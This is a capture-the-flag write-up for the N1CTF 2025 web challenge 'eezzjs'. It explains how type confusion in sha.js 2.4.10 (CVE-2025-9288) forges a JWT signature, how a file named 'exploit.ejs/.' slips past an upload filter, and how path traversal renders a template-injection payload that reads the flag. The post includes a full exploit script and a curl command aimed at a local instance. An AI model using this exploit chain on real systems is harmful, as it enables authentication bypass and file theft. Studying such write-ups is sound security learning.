---
title: "N1CTF 2025 - eezzjs"
subtitle: "o( ❛ᴗ❛ )o"
excerpt: "o( ❛ᴗ❛ )o"
date: 2025-11-01
categories: [web]
tags: [js, rce, ssti, pathTraversal]
ctfs: [n1ctf25]
author_profile: true
sidebar:
  nav: "docs"
header:
  overlay_color: "#000"
---

# Recon

Here is the challenge files hierarchy : 

```
.
├── Dockerfile
├── compose.yml
├── src
│   ├── app.js
│   ├── auth.js
│   ├── package-lock.json
│   ├── package.json
│   ├── uploads
│   └── views
│       ├── index.ejs
│       ├── login.ejs
│       └── upload.ejs
└── start.sh
```

We are facing an `expressjs` application, allowing us to *login* and *upload* files on a web application. The flag is apparently stored in following file : `/ffffffflag`, according to the `start.sh` script : 

```bash
if [ -n "$FLAG" ]; then
  echo $FLAG > /ffffffflag
else
  echo "hh";
fi


su -c "node /app/app.js" node
```

Also, the `ejs` template engine is used : 

```javascript
// app.js
app.set('view engine', 'ejs');
```

# Investigation

We can see that the `POST /upload` route uploads user-selected files to the `/uploads` directory after applying a regex filtering for the uploaded files not to have `js` in their extension : 

```javascript
function uploadFile(req, res) {
    var {filedata,filename}=req.body;
    var ext = path.extname(filename).toLowerCase();

    if (/js/i.test(ext)) {
        return  res.status(403).send('Denied filename');
    }
    var filepath = path.join(uploadDir,filename);

    if (fs.existsSync(filepath)) {
        return res.status(500).send('File already exists');
    }

    fs.writeFile(filepath, filedata, 'base64', (err) => {
        if (err) {
            console.log(err);
            res.status(500).send('Error saving file');
        } else {
            res.status(200).send({ message: 'File uploaded successfully', path: `/uploads/${path}` });
        }
    });
}
```

Also, we can see another interesting code stub when serving the `/` route : 

```javascript
function serveIndex(req, res) {
    var templ = req.query.templ || 'index';
    var lsPath = path.join(__dirname, req.path);
    try {
        res.render(templ, {
            filenames: fs.readdirSync(lsPath),
            path: req.path
        });
    } catch (e) {
        console.log(e);
        res.status(500).send('Error rendering page');
    }
}
```

When the `templ` parameter is specified in the query's url, the application will look for the arbitrarily specified model name in the `/views` directory and will try to render it using `ejs`, whithout proper sanitization of the path, thus leading to a **Path traversal** vulnerability.

Though, all the routes are authenticated using a `JWT` token, but a flaw in the token signing/verification functions makes the code craft hashes of the values over the string conversion of the objects, due to a type confusion. Then, all the payloads of the compared and created token are equal to the literal string : `"[object Object]"`. Thus, only validating the tokens over the `signature`, itself based on the `secret`.

Then, without access to the `secret` of the application, which is a random 9-bytes hex value, we cannot craft a valid admin token, or could we ? By looking at the dependencies, we can see that the project uses a vulnerable version of the `sha.js` library : 

```json
  "dependencies": {
    "sha.js": "2.4.10"
	[...]
  },
```

This version of the `sha.js` is vulnerable to the `CVE-2025-9288`, which can lead to hash rewinds and other undesired issues :
> https://github.com/advisories/GHSA-95m3-7q98-8xr5

By using an adapted payload, we could rewing the internal state of the hashing function and hijack hashes comparison by sending it to the hashing function of the application : 

```javascript
	[...]
    const expectedSignatureHex = sha256(...[JSON.stringify(header), payload, secret]);

    let providedSignature;
    let expectedSignature;
    try {
        providedSignature = Buffer.from(signature, 'hex');
        expectedSignature = Buffer.from(expectedSignatureHex, 'hex');
    } catch (err) {
        return null;
    }

    if (
        providedSignature.length !== expectedSignature.length ||
        !crypto.timingSafeEqual(providedSignature, expectedSignature)
    ) {
        return null;
    }
	[...]
```

# Attack pipeline

- Bypass authentication by crafting a malicious JWT (**Improper Input Validation**)
- Upload a malicious file that retrieves the flag in a template format using an (**SSTI**, **Path traversal**)
- Render this template using the conception vulnerability of the `serveIndex` function (**RCE**)

# Exploitation

In `sha.js@2.4.10` the type of the object to be hashed, passed to the `update(data, enc)` , is not properly checked : 

```javascript
Hash.prototype.update = function (data, enc) {
  if (typeof data === 'string') {
    enc = enc || 'utf8'
    data = Buffer.from(data, enc)
  }

  var block = this._block
  var blockSize = this._blockSize
  var length = data.length
  var accum = this._len

  for (var offset = 0; offset < length;) {
    var assigned = accum % blockSize
    var remainder = Math.min(length - offset, blockSize - assigned)

    for (var i = 0; i < remainder; i++) {
      block[assigned + i] = data[offset + i]
    }

    accum += remainder
    offset += remainder

    if ((accum % blockSize) === 0) {
      this._update(block)
    }
  }

  this._len += length
  return this
}
```

Therefore, by passing an object like `{ length : <negative int> }`, the `data.length` instruction will select the arbitrary attribute instead of the `string`/`Buffer` one, therefore leading to type confusion, by choosing a negative int, we can arbitrarily make the hash length less than it is in reality, thus removing values from the final hash computation.

Therefore, we could craft a payload that will make the hash function result into a `0-length` digest, thus making the final hash only dependant of the internal state of the hash function, which at this point will be only affected by the `m.update` applied to the `header`.

The bytes of the `header` are copied into the hash function's first block, then the length being negative, the ones from the `secret` won't be copied and the `digest` will be computed based on the bytes of the header.

For crafting the `JWT`, let's build our exploit :

```javascript
function draftJWT() {
  const header = { alg: "HS256", exp: Math.floor(Date.now() / 1000) + 3600 };
  const payload = { length: -(18 + JSON.stringify(header).length) }; // secret.length == 18
  console.log(payload.length);
  const secret = crypto.randomBytes(9).toString("hex");
  const validMessage = [JSON.stringify(header), payload, secret];

  const base64Header = toBase64Url(JSON.stringify(header));
  const base64Payload = toBase64Url(JSON.stringify(payload));
  return `${base64Header}.${base64Payload}.${sha256(...validMessage)}`; // the calculated hash is only header-dependant
}
```

Then, because the `payload` isn't stringified on the server-side, the signature computed by the server will be the same as the one we crafted and embedded in our `JWT` .

We can then create a simple malicious `ejs` template that will just return the content of the flag : 

`exploit.ejs`
```
<%- process.mainModule.require("fs").readFileSync('/ffffffflag', 'utf-8')%>
```

Using a **SSTI** we are able to bypass the regex filter by renaming our exploit `exploit.ejs/.` as the regex will detect the extension as an empty one, and the `fs` module will sanitize the filename when saving it for `exploit.ejs` : 

`exploit.js`
```javascript
const crypto = require("crypto");
const fs = require("fs");
const sha = require("sha.js");
const toBase64Url = (input) => {
  const buffer = Buffer.isBuffer(input) ? input : Buffer.from(input);
  return buffer
    .toString("base64")
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=+$/, "");
};

const sha256 = (...messages) => {
  const hash = sha("sha256");
  messages.forEach((m) => hash.update(m));
  return hash.digest("hex");
};

function draftJWT() {
  const header = { alg: "HS256", exp: Math.floor(Date.now() / 1000) + 3600 };
  const payload = { length: -(18 + JSON.stringify(header).length) };
  const secret = crypto.randomBytes(9).toString("hex");
  const validMessage = [JSON.stringify(header), payload, secret];

  const base64Header = toBase64Url(JSON.stringify(header));
  const base64Payload = toBase64Url(JSON.stringify(payload));
  return `${base64Header}.${base64Payload}.${sha256(...validMessage)}`;
}

async function main() {
  
  const filename = "exploit.ejs/.";
  const content = fs.readFileSync("exploit.ejs", "utf-8");
  const filedata = Buffer.from(content).toString("base64");

  const token = draftJWT();
  const cookieValue = encodeURIComponent(token);
  const resp = await fetch("http://localhost:3000/upload?templ=login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Cookie: `token=${cookieValue}`,
    },
    body: JSON.stringify({ filedata, filename }),
  }).then((respText) => {
    console.log(respText);
  }).catch((ignored) => {});
}

main();

```

By now rendering our template we are able to retrieve the flag : 

```
curl "http://localhost:3000/?templ=../uploads/exploit.ejs"
```

> n1ctf{13189936-621c-4cc3-84cb-7378e3d0833a}
